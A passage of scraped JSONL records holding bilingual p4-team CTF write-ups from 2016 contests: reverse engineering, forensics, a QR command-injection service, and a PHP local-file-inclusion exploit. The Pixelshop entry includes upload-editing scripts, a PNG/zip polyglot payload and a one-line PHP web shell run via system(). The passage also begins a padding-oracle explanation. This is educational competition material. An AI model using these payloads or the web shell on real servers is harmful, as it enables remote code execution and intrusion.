dowiedzieliśmy się, że to dane\nskompresowane zlibem: `Send your QR code:`.\n\nWysłanie czegokolwiek mówi nam, że należy wysłac maksymalnie 200 bajtów. Po wysłaniu takiej właśnie ilości danych,\ndowiadujemy się, że dane nie są poprawnie skompresowane. No to wysyłamy skompresowany zlibem tekst \"aaa\" z dorzuconymi\nbajtami zerowymi na koniec, po czym otrzymujemy wiadomość `Sorry, no decode delegate for this image :|`. \nWygooglanie tego tekstu mówi, że to zwykły błąd ImageMagick - w tym momencie domyśliliśmy się, że należy wysłać\nskompresowany obrazek z QR. Wysyłamy więc QR z \"aaa\":\n```\nProcessing the received command...\nThe output of your command is large, I only send 18 bytes of it :P \nSorry, command not\n```\nTekst jest więc pewnie wykonywany jako komenda. Potwierdziliśmy to wysyłając QR z `ls` - wylistowaliśmy plik `flag`.\nNadal trzeba było obejść ograniczenie wielkości komendy (200 bajtów na obrazek z QR) i na odpowiedź serwera (18\nbajtów). Ostatecznie, używając `tail -c 40 flag` udało nam się kawałek po kawałku wyciągnąć flagę.\n", "timestamp": "2025-10-21T13:31:26.649136"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-02-05-sharif/re_100_android/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-02-05-sharif/re_100_android/README.md", "content": "﻿## Android (Reverse, 100p)\n\n> Find the Flag!!\n> [Download](Sharif_CTF.apk)\n\n###ENG\n[PL](#pl-version)\n\nWe download android application given to us by challenge creators.\nFirst think we do is packing it into java decompiler (http://www.javadecompilers.com/apk).\n\nMost of code is boring and uninteresting, but one of functions is clearly more interesting:\n\n```java\npublic void onClick(View view) {\n    String str = new String(\" \");\n    str = this.f5a.f1b.getText().toString();\n    Log.v(\"EditText\", this.f5a.f1b.getText().toString());\n    String str2 = new String(\"\");\n    int processObjectArrayFromNative = this.f5a.processObjectArrayFromNative(str);\n    int IsCorrect = this.f5a.IsCorrect(str);\n    str = new StringBuilder(String.valueOf(this.f5a.f3d + processObjectArrayFromNative)).append(\" \").toString();\n    try {\n        MessageDigest instance = MessageDigest.getInstance(\"MD5\");\n        instance.update(str.getBytes());\n        byte[] digest = instance.digest();\n        StringBuffer stringBuffer = new StringBuffer();\n        for (byte b : digest) {\n            stringBuffer.append(Integer.toString((b & 255) + 256, 16).substring(1));\n        }\n        if (IsCorrect == 1 && this.f5a.f4e != \"unknown\") {\n            this.f5a.f2c.setText(\"Sharif_CTF(\" + stringBuffer.toString() + \")\");\n        }\n        if (IsCorrect == 1 && this.f5a.f4e == \"unknown\") {\n            this.f5a.f2c.setText(\"Just keep Trying :-)\");\n        }\n        if (IsCorrect == 0) {\n            this.f5a.f2c.setText(\"Just keep Trying :-)\");\n        }\n    } catch (NoSuchAlgorithmException e) {\n        e.printStackTrace();\n    }\n}\n```\n\nAs you can see, this function gets text from button and uses \"IsCorrect\" method to check input validity. If input is valid, flag is given to the user.\n\nFortunately, IsCorrect is native function, so we have to disassemble ARM library to get our hands on the flag.\n\n[libadnjni.so](libadnjni.so)\n\nFunction IsCorrect is very long, but most of it is not important. In fact, everything it does is calling strcmp on constant input.\nTo be precise, input from user is compared to hardcoded string 'ef57f3fe3cf603c03890ee588878c0ec'.\n\nIt's enough to enter this string into application as password and we get the flag.\n\n###PL version\n\nPobieramy androidową aplikację którą dają nam twórcy zadania. Pierwsze co robimy, to pakujemy ją do dekompilera javy (http://www.javadecompilers.com/apk).\n\nWiekszość kodu to jak zwykle śmieci, ale znajdujemy jedną ciekawą funkcję:\n\n```java\npublic void onClick(View view) {\n    String str = new String(\" \");\n    str = this.f5a.f1b.getText().toString();\n    Log.v(\"EditText\", this.f5a.f1b.getText().toString());\n    String str2 = new String(\"\");\n    int processObjectArrayFromNative = this.f5a.processObjectArrayFromNative(str);\n    int IsCorrect = this.f5a.IsCorrect(str);\n    str = new StringBuilder(String.valueOf(this.f5a.f3d + processObjectArrayFromNative)).append(\" \").toString();\n    try {\n        MessageDigest instance = MessageDigest.getInstance(\"MD5\");\n        instance.update(str.getBytes());\n        byte[] digest = instance.digest();\n        StringBuffer stringBuffer = new StringBuffer();\n        for (byte b : digest) {\n            stringBuffer.append(Integer.toString((b & 255) + 256, 16).substring(1));\n        }\n        if (IsCorrect == 1 && this.f5a.f4e != \"unknown\") {\n            this.f5a.f2c.setText(\"Sharif_CTF(\" + stringBuffer.toString() + \")\");\n        }\n        if (IsCorrect == 1 && this.f5a.f4e == \"unknown\") {\n            this.f5a.f2c.setText(\"Just keep Trying :-)\");\n        }\n        if (IsCorrect == 0) {\n            this.f5a.f2c.setText(\"Just keep Trying :-)\");\n        }\n    } catch (NoSuchAlgorithmException e) {\n        e.printStackTrace();\n    }\n}\n```\n\nJak widać, jest jest na czymś wywoływana funkcja IsCorrect, i jeśli wywołanie zakończy sie sukcesem, flaga jest przekazywana użytkownikowi.\n\nNiestety (albo na szczęście), IsCorrect jest funkcją natywną, więc żeby ją przeanalizować musimy disasemblować ARMową bibliotekę\n\n[libadnjni.so](libadnjni.so)\n\nFunkcja IsCorrect zawiera bardzo dużo kodu, ale większośc jest niepotrzebna. Tak naprawdę wywołuje tylko strcmp ze stałym napisem.\nKonkretnie input użytkownika jest porównywany z 'ef57f3fe3cf603c03890ee588878c0ec'.\n\nWystarczy wprowadzić tą wartość w aplikacji androidowej, i dostajemy flagę. 100 punktów do przodu.\n", "timestamp": "2025-10-21T13:31:26.907278"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-02-05-sharif/re_150_serial/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-02-05-sharif/re_150_serial/README.md", "content": "## Serial (Reverse, 150p)\n\n    Run and capture the flag!\n    \n    Download serial\n\n###ENG\n[PL](#pl-version)\n\nWe were given a binary, asking for a serial and telling us whether it's correct. Disassembling it gave a weird result - \nfor example:\n```\n0x00400a2c      je 0x400a3c\n0x00400a2e      mov ax, 0x5eb\n0x00400a32      xor eax, eax\n0x00400a34      je 0x400a30\n0x00400a36      call 0x424a24\n0x00400a3b      add byte [rdi], cl\n0x00400a3d      mov dh, 0x85\n```\nWe can see jumps into the middle of instruction, which misaligned further disassembled code. Thankfully, debugger was \nstill working just fine. Stepping through the code we can see a number of checks being done on our input.\nI decided to set registers manually to expected values whenever there was a `cmp` validating our input, which allowed me\nto do the task in a single run. The checks were pretty basic - for example:\n```\nmovzx eax, byte [rbp - 0x1ff]\nmovsx edx, al\nmovzx eax, byte [rbp - 0x1f2]\nmovsx eax, al\nadd eax, edx\ncmp eax, 0x9b\n```\nThis checked whether sum of two particular letters of our password are equal to 0x9B.\n\nAfter collecting all the checks like this one, we manually\ncalculated every character. Typing it into the binary confirms it's correct, so we submitted it as a flag.\n\n###PL version\n\nDostaliśmy binarkę proszącą o podanie hasła i odpowiadającej, czy jest ono poprawne. Deasemblacja niestety daje\ndziwne rezultaty, na przykład:\n```\n0x00400a2c      je 0x400a3c\n0x00400a2e      mov ax, 0x5eb\n0x00400a32      xor eax, eax\n0x00400a34      je 0x400a30\n0x00400a36      call 0x424a24\n0x00400a3b      add byte [rdi], cl\n0x00400a3d      mov dh, 0x85\n```\nWidzimy nietypowe skoki w środek instrukcji, które powodują nieprawidłową deasemblację kodu. Na szczęście debugger\ntakiego problemu nie ma, wiec mogliśmy przejść instrukcja po instrukcji i obserwować jak nasze hasło jest sprawdzane.\nPostanowiłem ręcznie ustawiać rejestry na oczekiwane wartości przed każdą instrukcją `cmp`, dzięki czemu wystarczyło\npojedyncze przejście przez binarkę. Na szczęście kod sprawdzający był dość prosty, na przykład:\n```\nmovzx eax, byte [rbp - 0x1ff]\nmovsx edx, al\nmovzx eax, byte [rbp - 0x1f2]\nmovsx eax, al\nadd eax, edx\ncmp eax, 0x9b\n```\nTen fragment sprawdzał, czy suma pewnych dwóch znaków hasła jest równa 0x9B.\n\nPo zebraniu wszystkich takich porównań, ręcznie ułożyliśmy hasło przechodzące je wszystkie. Binarka potwierdzała jego\npoprawność, zatem wysłaliśmy je jako flagę.\n", "timestamp": "2025-10-21T13:31:27.164581"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-02-05-sharif/re_50_srm/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-02-05-sharif/re_50_srm/README.md", "content": "﻿## SRM (Reverse, 50p)\n\n> The flag is : The valid serial number\n> [Download](RM.exe)\n\n###ENG\n[PL](#pl-version)\n\nWe downloaded windows binary and run it. It asks us to enter serial and checks its validity.\n\nWe disasembled it, and checked content of its DialogFunc. We can clearly see interesting fragment:\n\n```c\nif (strlen(v13) != 16\n  || v13[0] != 67\n  || v25 != 88\n  || v13[1] != 90\n  || v13[1] + v24 != 155\n  || v13[2] != 57\n  || v13[2] + v23 != 155\n  || v13[3] != 100\n  || v22 != 55\n  || v14 != 109\n  || v21 != 71\n  || v15 != 113\n  || v15 + v20 != 170\n  || v16 != 52\n  || v19 != 103\n  || v17 != 99\n  || v18 != 56 ) {\n    // FAIL\n  } else {\n    // OK\n  }\n```\n\nDifferent xXX stand for different characters of input - using debugger it's easy to check which variable is which character.\nReversing this check took a while, because every comparsion had to be implemented, but when we succeeded, we get valid serial that turned out to be flag:\n\n    CZ9dmq4c8g9G7bAX\n\n###PL version\n\nPobieramy windowsową binarkę i uruchamiamy. Prosi ona o podanie serialu i sprawdza jego poprawność.\n\nDisasemblujemy ją więc, i patrzymy na zawartośc DialogFunc. Od razu widać ciekawy fragment:\n\n```c\nif (strlen(v13) != 16\n  || v13[0] != 67\n  || v25 != 88\n  || v13[1] != 90\n  || v13[1] + v24 != 155\n  || v13[2] != 57\n  || v13[2] + v23 != 155\n  || v13[3] != 100\n  || v22 != 55\n  || v14 != 109\n  || v21 != 71\n  || v15 != 113\n  || v15 + v20 != 170\n  || v16 != 52\n  || v19 != 103\n  || v17 != 99\n  || v18 != 56 ) {\n    // FAIL\n  } else {\n    // OK\n  }\n```\n\nRóżne vXX odpowiadają za różne znaki inputu - łatwo dojść do tego które odpowiadają za które przy użyciu debuggera.\nReversowanie tego zajęło chwilę bo trzeba było porównać wszystkie znaki, ale kiedy się udało, otrzymaliśmy poprawny serial, będący równoczesnie flagą:\n\n    CZ9dmq4c8g9G7bAX\n", "timestamp": "2025-10-21T13:31:27.529833"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-03-18-insomnihack-final/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-03-18-insomnihack-final/README.md", "content": "# Writeup Insomnihack CTF final 2016\n\nTeam: mak, lympho, akrasuski1, msm, nazywam, other019, rev, shalom\n\n### Table of contents\n\n* [smartcat0 (web)](web_smartcat0)\n* secretsafe (web)\n* [smartcat3 (web)](web_smartcat3)\n* [robots (misc)](misc_robots)\n* smartdoor (misc)\n* GreenBox (web)\n* Idea1 (web)\n* Idea2 (web)\n* Superpollute (shellcode)\n* bIoTch (pwn)\n* microwave (pwn)\n\n", "timestamp": "2025-10-21T13:31:29.213325"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-03-26-pwn2win/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-03-26-pwn2win/README.md", "content": "# Writeup Pwn2Win 2016\n\nTeam: akrasuski1, nazywam, graszka22, c7f.m0d3, cr019283, mnmd21891, msm, other019, rev, shalom\n\n### Table of contents\n* Auswählen (Rev)\n* Build Throw (Phy)\n* [D3lc1d10 (Steg)](d3lc1d10)\n* [Death Sequence (PPC-M)](death_sequence)\n* Dizzness Ring (Phy)\n* Drone Fail (Phy)\n* [Dump (For)](dump)\n* [Eletronic Ballot Box Prototype (Elet)](electronic_ballot_box_prototype)\n* Ellection System (PPC-M)\n* File Burning pt. 1 (Net/Steg)\n* [Free Web Access (Web)](free_web_access)\n* g00d b0y (Bonus)\n* Give Feedback (Bonus)\n* [Hidden in Plain Sight (For)](hidden_in_plain_sight)\n* How to Win (PPC-M)\n* [iMathze (PPC)](imathz)\n* Magic Patterns (PPC)\n* Member Management System (Rev)\n* Painel Message (For)\n* People Release (Phy)\n* QRGrams (PPC)\n* RSA Signature (Crypto)\n* Samuel Riff Breese (For)\n* [Secret Accounts (PyExp)](secret_account)\n* Secure Chat (Web)\n* Sequences (PPC)\n* Simple Cryptography (Crypto)\n* Skycast:  (Story)\n* Sleeper cell (Rev)\n* Square Infinite Spiral (PPC-M)\n* String Criptography (Crypto)\n* Sum (Hello World Platform) (PPC-M)\n* Tokens (PyExp)\n* V0t3 (Web)\n* Visual Cryptography (Crypto)\n* Who Wins (PPC-M)\n", "timestamp": "2025-10-21T13:31:30.292337"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-03-26-pwn2win/dump/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-03-26-pwn2win/dump/README.md", "content": "----------------\n[Forensics] Dump - 50 points\n----------------\n\n> English:\n\n> We know this dump was generated by a process which was executing as root in the computer, and that it was reading directly from a /dev device. Probably it is part of a keylogger module included in a rootkit which is being tested by the Club. Help us to unveil this message, allowing us to discover why they infected this specific machine.\n\n> Submit the flag in the format: CTF-BR{message}\n\nIn this task we were given a `dump` file. Looking at it in hexeditor, we quickly notice that it almost repeats every\n24 bytes:\n```\n$ hexdump -C dump | head\n00000000  79 8e 8a 56 00 00 00 00  d0 59 0a 00 00 00 00 00  |y..V.....Y......|\n00000010  04 00 04 00 28 00 07 00  79 8e 8a 56 00 00 00 00  |....(...y..V....|\n00000020  d0 59 0a 00 00 00 00 00  01 00 1c 00 00 00 00 00  |.Y..............|\n00000030  79 8e 8a 56 00 00 00 00  d0 59 0a 00 00 00 00 00  |y..V.....Y......|\n00000040  00 00 00 00 00 00 00 00  7b 8e 8a 56 00 00 00 00  |........{..V....|\n00000050  7f b7 0a 00 00 00 00 00  04 00 04 00 e1 00 07 00  |................|\n00000060  7b 8e 8a 56 00 00 00 00  7f b7 0a 00 00 00 00 00  |{..V............|\n00000070  01 00 2a 00 01 00 00 00  7b 8e 8a 56 00 00 00 00  |..*.....{..V....|\n00000080  7f b7 0a 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000090  7b 8e 8a 56 00 00 00 00  82 2e 0c 00 00 00 00 00  |{..V............|\n```\nIn the task description `/dev` was mentioned. Googling Linux's treatment of keyboard we notice the following structure:\n```\nstruct input_event {\n\tstruct timeval time;\n\tunsigned short type;\n\tunsigned short code;\n\tunsigned int value;\n};\n```\nIt seems to fit our data - timeval was monotonically increasing, and the size of the structure was 24.\nWe found that `value` contains 0 or 1, depending on whether the key was pressed or released, the `type` that was\ninteresting for us was `EV_KEY` (1), and `code` was the keycode. In `keys.h` file from Linux source code there were all\nkeycode definitions. We copied interesting part of it and wrote a Python script to parse the dump. Running it, we get the\nflag:\n```\nI am suspicious of Fideleetos intentions\n```\n", "timestamp": "2025-10-21T13:31:30.654528"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-03-26-pwn2win/hidden_in_plain_sight/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-03-26-pwn2win/hidden_in_plain_sight/README.md", "content": "## Hidden in Plain Sight (Forensics)\n\ttl;dr read the file before it's been decrypted\n\nIn this task, we're only given a mega download link.(https://mega.nz/#!6N0gmRLK!VsN9gLdiYbxMVTA-AdsRjsvezMpdEqiR9ngwrS6gR7k)\n\nThe hint is: `you need to know the basic principle behind how MEGA works in order to solve this challenge. Flag.txt is the flag, but it is hidden... in plain sight ;)`\n\nMega doesn't store keys to decrypt your data, you are given them with the url, in our case it's `AdsRjsvezMpdEqiR9ngwrS6gR7k`. The files are download to a sandbox using *FileSystem API*.\n\nAfter the download is complete, the file is then decrypted using aes and passed to the normal download folder.\n\nThe downloaded flag looks like gibberish: `}Żv#ĘÖ›{QřČxJ\u0017ZzŃ\\\u0007\u001cM÷2Ž¸IĆ&N˛<­z´ŕ´„ĽĹ*‹—\u001cýk\u0003/ĂĂµ`\n\nLet's then try viewing the flag before it's been decrypted by using Chrome developer tools.\n\n![img1](scr1.png)\n\nBingo!", "timestamp": "2025-10-21T13:31:31.022683"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-04-14-confidence-teaser/network_ppc_amazeing/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-04-14-confidence-teaser/network_ppc_amazeing/README.md", "content": "# A...mazeing (Network / PPC, 200) (16 solvers)\n\tHi!. let's play old nes game. I just plugged this stuff to tcp ports for ya ...\n\tIP: amazeing.hackable.software\n\n![schematic](img.png)\n\nIn this task we were told that there is a service runnning a game\nand several TCP ports represent pressing various buttons on SNES\ncontroller.\n\nConnecting to the main server gave us game token and a position.\nConnecting to other ports and sending the token made the main server\nsend us an OK message (or failed one). We quickly thought it may be \nsome kind of maze or something, so we wrote a quick python script\n(`doit.py`) which discovers whole board using DFS - note that we had \nto increase stack limit.\n\nDrawing the board gives us the following image with the flag hidden on the bottom right corner:\n\n![flag](flag.png)\n", "timestamp": "2025-10-21T13:31:32.665482"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-04-15-plaid-ctf/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-04-15-plaid-ctf/README.md", "content": "# Writeup Plaid CTF 2016\n\nTeam: c7f.m0d3, akrasuski1, cr019283, nazywam, shalom, mnmd21891, msm, rev\n\n### Table of contents\n\n * [Rabit (Crypto)](crypto_rabit)\n * [Tonnerre (Crypto)](crypto_tonnerre)\n * [Pixelshop (Web)](web_pixelshop)\n * [Hevc (Misc)](misc_hevc)\n * [Morset (Misc)](misc_morset)\n * [The stuff (Misc)](misc_the_stuff)\n * [Untitled (Misc)](misc_untitled)\n * [Pound (Pwn)](pwnable_pound)\n * [Quixotic (Re)](reversing_quixotic)\n", "timestamp": "2025-10-21T13:31:33.223594"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-04-15-plaid-ctf/web_pixelshop/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-04-15-plaid-ctf/web_pixelshop/README.md", "content": "## Pixelshop (Web, 300 points, 15 solves)\n\n\tEveryone loves pixel art, and thanks to PixelShop you can now create pixel art from your browser! Exciting!\n\n###ENG\n[PL](#pl-version)\n\nWe get access to a webpage where we can upload icons (max 32x32) or even draw an icon with built-in editor.\nThose icons are then placed in /uploads directory with random name as png files.\nFirst thing we notice is the navigation on the page handled by a GET parameter `op`, eg `http://pixelshop.pwning.xxx/?op=upload`\nWe try to put some other values there and we determine that it's a file inclusion for `.php` files.\nWe use php filter-wrapper `php://filter/read=convert.base64-encode/resource=` to force base64 encoding of the included pages eg:\n\n`http://pixelshop.pwning.xxx/?op=php://filter/read=convert.base64-encode/resource=index`\n\nThis way we extract all source files (see [src](src) directory).\nSources analysis brings us to conclusion that:\n\n- The page only includes `.php` files because the extension is always added, and it's a new PHP so no null-byte poisoning\n- Any uploaded image will always have `.png` extension\n- We can only upload a proper image to the webpage\n- The image is stripped from metadata so no way to smuggle something in exif\n- We can manually set palette and image pixels using the built-in image edit feature of the webpage.\n\nThe first issue we had to overcome was the ability to include a file of our choosing.\nIt took us a while to figure out the approach but then we come up with an idea that if wrappers helped us once, they might help again.\nThere is a `zip://` wrapper which enables unzipping archives on the fly and provides access to the stored files.\nThis means that it's possible to run: `zip://path_to_zip#file_name` as `include()` argument and this way you can include the file from zip.\nThis means that if we could upload a zip archive with a php file inside to the webpage, we could then include it via:\n\n`http://pixelshop.pwning.xxx/?op=zip://uploads/our_zip%23file_inside`\n\nAnd this would unpack the archive and include `file_inside.php` file to the page.\nThis fixes the problem with file extension since we can control extension of the file inside zip.\nBut there is still problem with how to upload a zip file when we can only upload a valid image file.\nIt turns out a proper png file can be also a proper zip file!\nAnd the `zip://` does not take extension into consideration so it can unzip a `.png` file just as well, as long as it's a zip file.\n\nWe couldn't simply upload our rigged png file since it would be processed by the page, but we could edit it afterwards.\nThe edit feature provides API to set palette and pixels using JSON. \nPalette is very interesting because it is stored in consecutive bytes inside the PNG file.\nPalette needs to come as triplets (for RGB) so we prepare a function to convert given binary payload into palette bytes string:\n\n```python\ndef form_payload(payload):\n    b = [\"{:02x}\".format(ord(c)) for c in binascii.unhexlify(payload)]\n    for i in range(3-(len(b) % 3)): # padding\n        b.append(\"00\")\n    data = []\n    for i in range(0, len(b), 3):\n        data.append('\"#%s%s%s\"' % (b[i], b[i + 1], b[i + 2]))\n    return \",\".join(data)\n```\n\nAnd we prepare a script to edit selected uploaded png file on the webpage and to set our payload as palette bytes:\n\n```python\ndef edit_file(imagekey, palette_payload):\n    base_url = \"http://pixelshop.pwning.xxx/\"\n    url = base_url + \"?op=save\"\n    img = \",\".join(['0' for i in range(32 * 32)])\n    payload = form_payload(palette_payload)\n    jsonData = \"\"\"\n     {\n       \"pal\": [%s],\n       \"im\":[%s]\n     }\n    \"\"\" % (payload, img)\n    data = {\"imagekey\": imagekey, \"savedata\": jsonData}\n    result = requests.post(url, data=data)\n    print(result.content)\n    image_url = base_url + \"uploads/\" + imagekey + \".png\"\n    png = requests.get(image_url)\n    print(\" \".join(\"{:02x}\".format(ord(c)) for c in png.content))\n```\n\nNow we need to somehow make this png a proper ZIP file.\nThe interesting thing about ZIP files is that, unlike most file formats, the header of the file is somewhere at the end.\nSo the unzip is looking from the end of the file for the main header.\nWe can also mark anything after this header as \"comment\" and then unzip will ignore it.\nAdditionally the ZIP header specifies offsets (from the file start) at which the compressed data are stored.\nSince we know the \"prefix\" of the png file we can simply calculate the ZIP offsets by hand to start in the injected palette.\n\nWe execute the code with our crafted zip payload:\n\n`payload_raw = \"504B0304140000000800EE769148F0D042901D0000002100000005000000732E706870B3B12FC82850508977770D89564F548FD5803293D46335ADEDED78B900504B01021400140000000800EE769148F0D042901D00000021000000050000000000000001002000000029000000732E706870504B0506000000000100010033000000690000000000\"`\n\nAnd we get an image file uploaded on the server:\n\n![](exploit.png) \n\nWhich can be also unzipped, and inside stores `s.php` file with a simple PHP shell inside\n\n```php\n<?php $_GET['a']($_GET['b']); ?>\n```\n\nWith this file safely uploaded in the server as `847cf5ebb78615e61ab646189e3ffbff138801ad.png` we can finally run:\n\n`http://pixelshop.pwning.xxx/?a=system&b=ls /&op=zip://uploads/847cf5ebb78615e61ab646189e3ffbff138801ad.png%23s`\n\nWhich runs `system('ls /')`.\n\n![](ls.png)\n\n![](cat.png)\n\nAnd we finally get the flag:\n\n`PCTF{P1x3Ls_ar3_nIc3_but_Sh311_15_sw33ter_b271ea7f} `\n\n###PL version\n\nDostajemy dostęp do strony pozwalającej na uploadowanie ikonek (max 32x32) oraz na rysowanie/edytowanie ikonek przez wbudowany edytor.\nIkonki są następnie zapisywane w katalogu /uploads z losową nazwą jako pliki png.\nPierwsza rzecz którą zauważyliśmy to fakt, że nawigacja strony odbywa się za pomocą parametru GET `op`, np. `http://pixelshop.pwning.xxx/?op=upload`\nPróba umieszczania tam różnych wartości pozwala stwierdzić że ten parametr jest używany jako argument dla include plików `.php`\nWykorzystaliśmy więc filtr-wrapper php `php://filter/read=convert.base64-encode/resource=` żeby wymusić konwersje pliku do base64 przed includowaniem:\n\n`http://pixelshop.pwning.xxx/?op=php://filter/read=convert.base64-encode/resource=index`\n\nWe ten sposób uzyskujemy źródła wszystkich plików (patrz katalog [src](src)).\nAnaliza źródeł pozwala stwierdzić że:\n\n- Strona includuje tylko pliki `.php` ponieważ rozszerzenie jest zawsze doklejane, a jest to nowa wersja PHP niepodatna na null-byte poisoning\n- Każdy uploadowany plik będzie miał rozszerzenie `.png`\n- Możemy uploadować tylko poprawne obrazki\n- Obrazek jest czyszczony z metadanych więc nie ma możliwości przmycić czegoś w exif\n- Możemy ręcznie ustawić palete oraz piksele obrazu przez wbudowaną w stronę funkcje edycji ikonek\n\nPierwszy problem który musieliśmy pokonać to includowanie wybranego przez nas pliku.\nChwile zajęło nam dojście do rozwiązania, ale wreszcie pomyśleliśmy że skoro wrappery pomogły raz to mogą i drugi.\nPHP udostępnia wrapper `zip://` który pozwala w locie odpakować archiwum i uzyskać dostęp do jego zawartości.\nTo oznacza że można wykonać `zip://path_to_zip#file_name` jako parametr `include()` i tym samym includować plik z wnętrza zipa.\nTo oznacza że gdybyśmy mogli uploadować archiwum zip z plikiem php w środku, to moglibyśmy includować ten plik przez:\n\n`http://pixelshop.pwning.xxx/?op=zip://uploads/our_zip%23file_inside`\n\nI to pozwoliłoby odpakować archiwum i includować plik `file_inside.php` na stronę.\nTo rozwiązuje problem z rozszerzeniem pliku, ponieważ kontroluejmy rozszerzenie pliku wewnąrz zipa.\nNadal pozostaje jednak problem uploadowania archiwum zip podczas gdy strona pozwala umieszczać tylko poprawne obrazki.\nOkazuje się jednak że poprawny plik png może jednocześnie być poprawnym archiwum zip!\nA wrapper `zip://` nie bierze pod uwagę rozszerzenia piku więc może odpakować plik `.png` o ile jest to poprawne archiwum.\n\nNie mogliśmy po prostu uploadować przygotowanego pliku png ponieważ zostałby przez stronę przetworzony, ale mogliśmy do edytować.\nFunkcja edycji udostępniała API do ustawiania palety oraz pixeli przez JSONa.\nPaleta jest wyjątkowo interesująca bo jest składowana jako kolejne bajty w pliku PNG.\nPaleta była przyjmowana jako trójki (RGB) więc przygotowaliśmy funkcje konwertujacą podany payload na palete:\n\n```python\ndef form_payload(payload):\n    b = [\"{:02x}\".format(ord(c)) for c in binascii.unhexlify(payload)]\n    for i in range(3-(len(b) % 3)): # padding\n        b.append(\"00\")\n    data = []\n    for i in range(0, len(b), 3):\n        data.append('\"#%s%s%s\"' % (b[i], b[i + 1], b[i + 2]))\n    return \",\".join(data)\n```\n\nA następnie przygotowaliśmy skrypt edytowal plik png na stronie i ustawiał jako palete wybrane przez nas bajty:\n\n```python\ndef edit_file(imagekey, palette_payload):\n    base_url = \"http://pixelshop.pwning.xxx/\"\n    url = base_url + \"?op=save\"\n    img = \",\".join(['0' for i in range(32 * 32)])\n    payload = form_payload(palette_payload)\n    jsonData = \"\"\"\n     {\n       \"pal\": [%s],\n       \"im\":[%s]\n     }\n    \"\"\" % (payload, img)\n    data = {\"imagekey\": imagekey, \"savedata\": jsonData}\n    result = requests.post(url, data=data)\n    print(result.content)\n    image_url = base_url + \"uploads/\" + imagekey + \".png\"\n    png = requests.get(image_url)\n    print(\" \".join(\"{:02x}\".format(ord(c)) for c in png.content))\n```\n\nTeraz potrzebujemy sprawić żeby plik png był też plikiem ZIP.\nInteresujący fakt na temat plików ZIP jest taki, że w przeciwieństwie do większości formatów, nagłówek pliku jest gdzieś pod koniec.\nWięc unzip szuka od końca pliku w poszukiwaniu głównego nagłówka.\nDodatkowo możemy oznaczyć wszystko za nagłowkiem jako \"komentarz\" i unzip to zignoruje.\nCo więcej nagłówek ZIP specyfikuje offsetu (od początku pliku) gdzie znajdują się skompresowane dane.\nPonieważ znamy \"prefix\" pliku png możemy ręcznie policzyć offsety w pliku ZIP tak żeby zaczynały się we wstrzykiwanej palecie kolorów.\n\nWykonujemy skrypt z przygotowanym payloadem zip:\n\n`payload_raw = \"504B0304140000000800EE769148F0D042901D0000002100000005000000732E706870B3B12FC82850508977770D89564F548FD5803293D46335ADEDED78B900504B01021400140000000800EE769148F0D042901D00000021000000050000000000000001002000000029000000732E706870504B0506000000000100010033000000690000000000\"`\n\nI dostajemy na serwerze plik:\n\n![](exploit.png) \n\nKtóry może zostać odpakowany a w środku zawiera plik `s.php` z prostym php shellem:\n\n```php\n<?php $_GET['a']($_GET['b']); ?>\n```\n\nZ tym plikiem bezpiecznie leżącym na serwerze jako `847cf5ebb78615e61ab646189e3ffbff138801ad.png` możemy wreszcie uruchomić:\n\n`http://pixelshop.pwning.xxx/?a=system&b=ls /&op=zip://uploads/847cf5ebb78615e61ab646189e3ffbff138801ad.png%23s`\n\nCo daje nam przykładowo `system('ls /')`.\n\n![](ls.png)\n\n![](cat.png)\n\nI finalnie dostajemy flagę:\n\n`PCTF{P1x3Ls_ar3_nIc3_but_Sh311_15_sw33ter_b271ea7f} `\n", "timestamp": "2025-10-21T13:31:33.967295"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-09-16-csaw/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-09-16-csaw/README.md", "content": "# Writeup CSAW CTF Quals 2016\n\nTeam: c7f.m0d3, cr019283, nazywam, rev, msm, akrasuski1, shalom\n\n![](./scoreboard.png)\n\n### Table of contents\n\n* [Sleeping guard (Crypto)](sleeping_guard)\n* [Fuzyll (Recon)](fuzyll)\n* [Regexpire (Misc/PPC)](regexpire)\n* [Broken box (Crypto)](broken_box)\n* [Still broken box (Crypto)](still_broken_box)\n* [Neo (Crypto)](neo)\n", "timestamp": "2025-10-21T13:31:37.741875"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-09-16-csaw/neo/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-09-16-csaw/neo/README.md", "content": "## Neo (Crypto, 200p)\n\n###ENG\n[PL](#pl-version)\n\nThe task shows a webpage with Neo going to Oracle.\nThere is a html form with some base64 encoded data.\nDecoding gives some random 80 bytes blob.\nOnce every few seconds the data changes, most likely there is embedded timestamp.\nIf we provide our own base64 data in the form the page says that `AES decryption failed`.\nThis all points to `Padding Oracle Attack` - vulnerability which allows us to decode n-1 blocks of block cipher ciphertext in CBC mode.\n\nIn CBC mode the plaintext is XORed with previous block ciphertext.\nThis means that a change in a single byte of ciphertext will cause all bytes on corresponding positions in next blocks to be decrypted incorrectly, since they will be XORed with a wrong value.\nWhat we want to achieve in the attack is to exploit how decryption handles padding.\nIn PKCS7 padding the last byte of decrypted data defines padding.\nIt's a number which says how many padding bytes there are and also what value each of them holds.\nFor example if there is 3 byte padding the 16 byte block would be `XXXXXXXXXXXXX0x30x030x3`.\n\nIf the padding is not formed correctly we will get decryption error, since it means the data were tamered with.\nWhat we want to achieve with our attack is to try to guess the plaintext byte by attempting to \"transform\" it into padding.\n\nLet's assume we have 2 blocks of ciphertext.\nIf we change the last 